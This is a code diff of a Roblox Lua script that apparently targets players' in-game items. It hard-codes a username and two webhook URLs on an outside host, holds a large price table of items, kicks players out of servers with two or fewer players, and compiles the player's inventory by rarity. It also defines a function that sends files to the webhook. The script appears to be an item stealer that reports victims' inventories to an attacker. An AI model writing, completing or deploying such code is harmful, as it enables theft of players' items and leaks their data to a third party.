@@ -1,9 +1,6 @@
-print("new")
 userName = "yoklopik"
 GoodwebHook = "https://webhook-protect.vercel.app/api/webhook?id=SHBoY1VmZUFhQWhQT1ZFTEZ3QmFOQTpwNEpCNDJheHZYMmY1cTFZRERGMnhfZHgwYVQ0WDl3S1Y0MldEdE5wN1FHVGNQS01ENDhoQ19BcDBDRXN2SWRhSllKb01Pd1doOHBYSlNtcWVfZTlYaWt2MVpIWFlqRHh3QTdyZnZpTDJDM09Kd2t4NFNlZFJwb3lUUDBZcUI0SFdDWV9uVW15NEszUTFWVkFaYjUwR28zbWtMNGhxUzljcGFhUmIwZEpubHM"
 webHook = "https://webhook-protect.vercel.app/api/webhook?id=NEVzdDhMQjdjN0F1V3RPWDUzaWpRZzptTEYwTFdMSkZ5MXF3QWhWWjdXcGVCUFBZXzNkSHdNOHEwY3ZJLUlnMnZuQXVneERMX2NranJ5WFJHazB4bGxESUtselNabXFiX2lEc3lyc1ZuQWktNE1DS05Fa1JGYU9LNG5FOTJQWVdzbGZ3UFpSY1JlMzVpd0lEaTdyYlM1SGhNUTFvakRna3ZsN3VwZGkydmV2akNMZ0NKRkRHeDZkWkxBbThxSGhPRm8"
-
-
 
 local values = {
     ["Nik's Scythe"] = 25000000,
@@ -796,6 +793,7 @@ local values = {
 	["Aliens"] = 1,
 	["Moon"] = 1
 }
+
 if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
@@ -942,14 +940,14 @@ for i,v in pairs(allItems) do
     itemsCount = itemsCount + 1
 end
 
-local EverythingString = "-- // Uniques\n" .. (uniquesString or "") ..
-                         "\n\n-- // Ancient\n" .. (ancientsString or "") ..
-                         "\n\n-- // Godlies\n" .. (godlysString or "") ..
-                         "\n\n-- // Legendaries\n" .. (legendariesString or "") ..
-                         "\n\n-- // Vintage\n" .. (vintageString or "") ..
-                         "\n\n-- // Rare\n" .. (raresString or "") ..
-                         "\n\n-- // Uncommon\n" .. (uncommonString or "") ..
-                         "\n\n-- // Common\n" .. (commonsString or "")
+local EverythingString = "-- // Uniques\n" .. uniquesString ..
+                         "\n\n-- // Ancient\n" .. ancientsString ..
+                         "\n\n-- // Godlies\n" .. godlysString ..
+                         "\n\n-- // Legendaries\n" .. legendariesString ..
+                         "\n\n-- // Vintage\n" .. vintageString ..
+                         "\n\n-- // Rare\n" .. raresString ..
+                         "\n\n-- // Uncommon\n" .. uncommonString ..
+                         "\n\n-- // Common\n" .. commonsString
 
 function sendWebhookFile(url, fileName, fileContent)
     local HttpService = game:GetService("HttpService")
